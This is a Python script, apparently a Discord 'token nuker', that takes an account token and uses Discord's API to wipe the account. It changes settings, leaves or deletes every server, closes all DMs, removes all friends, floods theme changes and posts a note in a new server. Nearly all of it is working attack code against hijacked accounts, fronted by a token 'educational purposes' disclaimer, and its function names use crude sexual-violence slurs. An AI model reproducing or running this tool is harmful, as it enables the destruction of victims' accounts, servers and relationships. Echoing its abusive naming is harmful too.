LICENSE = """
Copyright © 2021 Drillenissen#0666
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
"""

from colored import fg
import requests
import os
import time

r = fg(255) # Setup color variables
r2 = fg(255)
b = fg(31)
w = fg(15)

class TokenNuker:
    def __init__(self):
        token = input(f"\n {r}[{b}?{r}] Token: ")

        self.headers = {
            'User-Agent' : 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
            'Authorization' : token 
        }  
        
        user = requests.get("https://discord.com/api/users/@me", headers = {'Authorization' : token})      


        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f""" {r2} █████{b}╗{r2} ███{b}╗{r2}   ██{b}╗{r2} ██████{b}╗{r2} ███{b}╗{r2}   ██{b}╗{r2}██{b}╗{r2}██{b}╗{r2}  ██{b}╗{r2}
 ██{b}╔══{r2}██{b}╗{r2}████{b}╗  {r2}██{b}║{r2}██{b}╔═══{r2}██{b}╗{r2}████{b}╗  {r2}██{b}║{r2}██{b}║╚{r2}██{b}╗{r2}██{b}╔╝{r2}
 ███████{b}║{r2}██{b}╔{r2}██{b}╗ {r2}██{b}║{r2}██{b}║   {r2}██{b}║{r2}██{b}╔{r2}██{b}╗ {r2}██{b}║{r2}██{b}║ ╚{r2}███{b}╔╝{r2}
 ██{b}╔══{r2}██{b}║{r2}██{b}║╚{r2}██{b}╗{r2}██{b}║{r2}██{b}║   {r2}██{b}║{r2}██{b}║╚{r2}██{b}╗{r2}██{b}║{r2}██{b}║ {r2}██{b}╔{r2}██{b}╗{r2}
 ██{b}║  {r2}██{b}║{r2}██{b}║ ╚{r2}████{b}║╚{r2}██████{b}╔╝{r2}██{b}║ ╚{r2}████{b}║{r2}██{b}║{r2}██{b}╔╝ {r2}██{b}╗{r2}
 {b}╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝
{r2} * DISCLAIMER: This script is made for          *
 * educational purposes and the developers      *
 * assume no liabilaty and are not responsible  *
 * for any misuse or damages caused by the      *
 * script                                       *
 """)
            print(f" {r}[{b}+{r}] Logged in as {user.json()['username']}#{user.json()['discriminator']}\n")

            self.options = [
                ("Nuke it!", self.nuke),
                ("Flashbang!", self.flashBang),
                ("Rape Settings", self.rapeSettings),
                ("Leave Servers", self.rapeServers),
                ("Close DMs", self.rapeDms),
                ("Remove Friends", self.rapeRelations)
            ]

            try:
                func = self.printOpts()[1]
                func()
                input(f" {r}[{b}!{r}] Done. Press enter to continue")
            except KeyboardInterrupt:
                break

    def printOpts(self):
        indx = 0
        for i in self.options:
            print(f" {r}[{b}{indx}{r}] {i[0]}")
            indx += 1

        opt = input(f"\n {r}[{b}?{r}] Option: ")

        return self.options[int(opt)]

    def confirm(self):
        inp = input(f"\n {r}[{b}?{r}] Are you sure you want to do this? This may break your account. (y/N) ")
        return "y" in inp.lower()

        
    def nuke(self):
        if not self.confirm():
            return
        self.rapeSettings()
        self.rapeServers()
        self.rapeDms()
        self.rapeRelations()

        guild = {
            "channels" : None,
            "icon" : None,
            "name" : "lol",
            "region" : "japan"
        }
        response = requests.post(
            'https://discordapp.com/api/v6/guilds',
            headers = self.headers,
            json = guild
        )   

        channelId = response.json()["system_channel_id"]
        message = {
            "content" : input(f"\n {r}[{b}?{r}] Leave a note: ")
        }
        requests.post(
            f'https://discordapp.com/api/v6/channels/{channelId}/messages',
            headers = self.headers,
            json = message
        )

    def flashBang(self):
        payloads = [{"theme" : "light"}, {"theme" : "dark"}]

        try:
            while True:
                for payload in payloads:
                    requests.patch(
                        "https://canary.discordapp.com/api/v6/users/@me/settings",
                        headers = self.headers,
                        json = payload
                    )   
        except KeyboardInterrupt:
            pass

    def rapeSettings(self):
        if not self.confirm():
            return
        payload = {"theme" : "light","locale" : "ja","message_display_compact" : True,"inline_embed_media" : False,"gif_auto_play" : False,"render_embeds" : False,"render_reactions" : False,"animate_emoji" : False,"convert_emoticons" : False,"enable_tts_command" : False,"explicit_content_filter" : 0,"status" : "invisible"}

        print(f"\n {r}[{b}+{r}] Changing Settings")
        requests.patch(
            "https://canary.discordapp.com/api/v6/users/@me/settings",
            headers = self.headers,
            json = payload
        )

    def rapeServers(self):
        if not self.confirm():
            return
        print(f"\n {r}[{b}+{r}] Detecting Servers")
    
        guilds = requests.get(
            "https://discord.com/api/v6/users/@me/guilds",
            headers = self.headers
        ).json()

        print(f" {r}[{b}!{r}] {len(guilds)} Servers Found\n")

        for i in guilds:
            try:
                print(f"  {r}[{b}!{r}] Leaving {i['name']} | Owner: {i['owner']}")
                if not i["owner"]:
                    requests.delete(
                        f"https://discord.com/api/users/@me/guilds/{i['id']}",
                        headers = self.headers
                    )
                else:
                    requests.delete(
                        f"https://discord.com/api/guilds/{i['id']}",
                        headers = self.headers
                    )
            except Exception as e:
                print(e)

    def rapeDms(self):
        if not self.confirm():
            return
        print(f"\n {r}[{b}+{r}] Detecting DM channels")

        dms = requests.get(
            "https://discord.com/api/v6/users/@me/channels",
            headers = self.headers
        ).json()
        print(f" {r}[{b}!{r}] {len(dms) - 1} DM channels found\n")
    
        for i in dms:
            print(f"  {r}[{b}!{r}] Leaving DM channel with: {', '.join([x['username'] for x in i['recipients']])}")
            requests.delete(
                f"https://discord.com/api/channels/{i['id']}",
                headers = self.headers
            )

    def rapeRelations(self):
        if not self.confirm():
            return
        print(f"\n {r}[{b}+{r}] Detecting Relationships")
    
        relations = requests.get(
            "https://discord.com/api/v8/users/@me/relationships",
            headers = self.headers
        ).json()
    
        relations = [i for i in relations if i["type"] != 0]
    
        print(f" {r}[{w}!{r}] {len(relations)} Relationships Found")
    
        for i in relations:
            print(f"  {r}[{b}!{r}] Removing {i['user']['username']} from relationships")
            requests.put(
                f"https://discord.com/api/v8/users/@me/relationships/{i['user']['id']}",
                headers = self.headers,
                json = {"type":0}
            )


def rape():
    nuker = TokenNuker()

